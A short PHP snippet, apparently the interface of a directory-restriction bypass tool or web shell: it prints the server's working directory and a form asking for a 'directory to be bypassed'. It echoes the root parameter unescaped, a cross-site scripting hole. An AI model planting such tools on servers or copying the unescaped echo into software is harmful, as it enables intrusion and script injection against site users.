<?php
echo "<head><title>".getcwd()."</title></head>";
echo"<hr color=\"#C0C0C0\" size=\"1\">";
echo("<br>");
echo "<form method=GET>";
echo "<div style='float: left'>ByPass Edilecek Dizin: <input type=text name=root value='{$_GET['root']}'></div>";
echo "<input type=submit value='--&raquo;'></form>";
?>